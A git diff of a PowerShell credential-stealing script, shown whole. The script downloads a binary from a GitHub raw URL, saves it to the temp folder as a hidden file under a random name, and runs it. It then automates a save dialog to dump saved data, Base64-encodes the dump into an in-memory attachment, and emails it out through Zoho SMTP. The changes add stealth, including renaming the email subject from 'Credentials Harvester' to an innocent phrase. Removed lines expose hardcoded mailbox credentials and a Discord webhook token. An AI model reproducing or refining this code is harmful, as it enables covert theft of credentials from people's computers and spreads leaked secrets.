@@ -1,91 +1,40 @@
-$global:isEmailSent = $false
-function SetEmailSentTrue {$global:isEmailSent = $true}
-function SetEmailSentFalse {$global:isEmailSent = $false}
-
-function Send-EmailNotification {
+function New-MemoryAttachment {
     param (
-        [string]$ToEmail,
-        [string]$WebhookUrl,
-        [string]$Message
+        [Parameter(Mandatory=$true)]
+        [string]$Data,
+        
+        [Parameter(Mandatory=$false)]
+        [string]$FileName = "ani.txt",
+        
+        [switch]$Obfuscate = $true
     )
 
-    # Create the payload
-    $payload = @{
-        content = $Message
-    } | ConvertTo-Json
-
-    # Send the webhook notification
     try {
-        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $payload -ContentType 'application/json' -ErrorAction Stop
-        Write-Host "Webhook notification sent successfully."
-    } catch {
-        Write-Host "Error sending webhook notification: $_"
+        # 1. Obfuscate if requested (Base64)
+        $contentToStream = $Data
+        if ($Obfuscate) {
+            $bytes = [System.Text.Encoding]::UTF8.GetBytes($Data)
+            $contentToStream = [System.Convert]::ToBase64String($bytes)
+        }
+
+        # 2. Setup Memory Stream
+        $ms = New-Object System.IO.MemoryStream
+        $writer = New-Object System.IO.StreamWriter($ms)
+        $writer.Write($contentToStream)
+        $writer.Flush()
+        
+        # 3. Reset position so the Mail Client reads from the beginning
+        $ms.Position = 0
+
+        # 4. Return the Attachment Object
+        # Note: We return both the attachment and the stream to keep it in RAM
+        return New-Object Net.Mail.Attachment($ms, $FileName)
+    }
+    catch {
+        Write-Error "Failed to create memory attachment: $($_.Exception.Message)"
+        return $null
     }
 }
-
-# function Send-ZohoEmail {
-#     param (
-#         [string]$FromEmail = "zqrvstef0rc5edk@zohomail.com",
-#         [string]$ToEmail = "srve650@gmail.com",
-#         [string]$Subject,
-#         [string]$Body = "Hello, this is a test email with an attachment.",
-#         # [string[]]$Attachments = @(),  # Optional parameter for attachments
-#         [PSObject[]]$Attachments = @(),
-#         [string]$SmtpServer = "smtp.zoho.com",
-#         [int]$Port = 587,
-#         [string]$Username = "zqrvstef0rc5edk@zohomail.com",
-#         [string]$Password = "LHjzKTbzDApt"
-#     )
-
-#     $email_webhookUrl = "https://discord.com/api/webhooks/1300835436918341745/yAGXpLFdBLnxfyQzn0wncm3rKsy3_m9mqc1KstctEIp25zs3iByJyNgEG036Oh7ENGMu"
-
-#     # Create the email message
-#     $mailMessage = New-Object System.Net.Mail.MailMessage
-#     $mailMessage.From = $FromEmail
-#     $mailMessage.To.Add($ToEmail)
-#     $mailMessage.Subject = $Subject
-#     $mailMessage.Body = $Body
-
-#     # Attach logic that handles BOTH physical files and Memory Objects
-# foreach ($item in $Attachments) {
-#     # Check if the item is already a pre-built Attachment object
-#     if ($item.GetType().FullName -eq "System.Net.Mail.Attachment") {
-#         $mailMessage.Attachments.Add($item)
-#     }
-#     # Check if the item is a string (a path) and if that file exists
-#     elseif ($item -is [string] -and (Test-Path $item)) {
-#         $fileAttach = New-Object System.Net.Mail.Attachment($item)
-#         $mailMessage.Attachments.Add($fileAttach)
-#     } 
-#     else {
-#         # This triggers if it's a string that doesn't exist OR a bad object
-#         Write-Host "Warning: Invalid attachment or file not found - $item" -ForegroundColor Yellow
-#     }
-# }
-
-#     # Configure the SMTP client
-#     $smtpClient = New-Object Net.Mail.SmtpClient($SmtpServer, $Port)
-#     $smtpClient.EnableSsl = $true
-#     $smtpClient.Credentials = New-Object System.Net.NetworkCredential($Username, $Password)
-
-#     # Send the email
-#     try {
-#         Write-Host "Sending Email via Zoho.... please wait..."
-#         $smtpClient.Send($mailMessage)
-#         Write-Host "Email sent successfully."
-#         $message = "Email sent successfully to $ToEmail. " + $Subject
-#         Send-EmailNotification -ToEmail $ToEmail -WebhookUrl $email_webhookUrl -Message $message
-#         # SetEmailSentTrue # Ensure this function is defined elsewhere in your script
-#     } catch {
-#         Write-Host "Error sending email: $($_.Exception.Message)" -ForegroundColor Red
-#         # SetEmailSentFalse
-#     } finally {
-#         # Clean up
-#         $mailMessage.Dispose()
-#         $smtpClient.Dispose()
-#     }
-# }
-
 
 function Send-ZohoEmail {
     param (
@@ -131,8 +80,6 @@ function Send-ZohoEmail {
     }
 }
 
-
-
 # Run WBPV 
         $url = "https://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/example.txt"  # Define the URL of the file to be downloaded
         $tempPath = [System.IO.Path]::Combine($env:TEMP, "example.txt")  # Define the path to save the file in the %temp% folder
@@ -149,8 +96,13 @@ function Send-ZohoEmail {
         }
 
         # Create a temporary file to hold the executable
-        $tempExePath = Join-Path $env:TEMP "example.exe"
+        $randName = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
+        $tempExePath = Join-Path $env:TEMP "$randName.exe"
         [System.IO.File]::WriteAllBytes($tempExePath, $bytes)
+        (Get-Item $tempExePath).Attributes = 'Hidden'
+
+        # $tempExePath = Join-Path $env:TEMP "example.exe"
+        # [System.IO.File]::WriteAllBytes($tempExePath, $bytes)
         $process = Start-Process $tempExePath # Start the executable
 
         #  SAVED DATA 
@@ -169,41 +121,28 @@ function Send-ZohoEmail {
         Start-Sleep -Milliseconds 500  # Wait for the input
         [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")  # Press Enter to save
 
-        Start-Sleep -Seconds 2 # Wait a moment for the file to save
+        Start-Sleep -Seconds 1 # Wait a moment for the file to save
         Get-Process | Where-Object { $_.Path -like "$env:TEMP\example.exe" } | Stop-Process -Force # Cleanup any lingering processes
 
 if (Test-Path $outputFilePath) {
     $rawData = Get-Content $outputFilePath -Raw
-    
-    # 2. Convert to Base64 for Obfuscation
-    $b64Bytes = [System.Text.Encoding]::UTF8.GetBytes($rawData)
-    $b64String = [System.Convert]::ToBase64String($b64Bytes)
 
-    # 3. Setup Memory Stream
-    $ms = New-Object System.IO.MemoryStream
-    $writer = New-Object System.IO.StreamWriter($ms)
-    $writer.Write($b64String)
-    $writer.Flush()
-    $ms.Position = 0
+    # Use the function to create the RAM-only attachment
+    $attachment = New-MemoryAttachment -Data $rawData -FileName "anihan.txt" -Obfuscate $true
 
-    # 4. Create Attachment (Fixed line)
-    $attachment = New-Object Net.Mail.Attachment($ms, "encoded_vault.txt")
-
-    # 5. Send Email Logic here...
-    $subject = "$env:USERNAME: Credentials Harvester - Sent on $currentDateTime"
-    $attachments = @($attachment)  # Array of attachment file paths
-
-    # Use @() to ensure it stays an array of objects
-    Send-ZohoEmail -Subject $subject -Attachments @($attachment)
-    
-    # 6. Cleanup physical evidence
-    $attachment.Dispose()
-    $ms.Dispose()
-    Remove-Item $outputFilePath -Force
+    if ($null -ne $attachment) {
+        $subject = "$env:USERNAME: Ang Anihan sa Bukirin"
+        
+        # Send using your updated Zoho function
+        Send-ZohoEmail -Subject $subject -Attachments @($attachment)
+        
+        # Cleanup
+        $attachment.Dispose()
+        Remove-Item $outputFilePath -Force
+    }
 } else {
     Write-Host "Error: Save-As operation failed. Data file not found." -ForegroundColor Red
 }
-
 
 
 
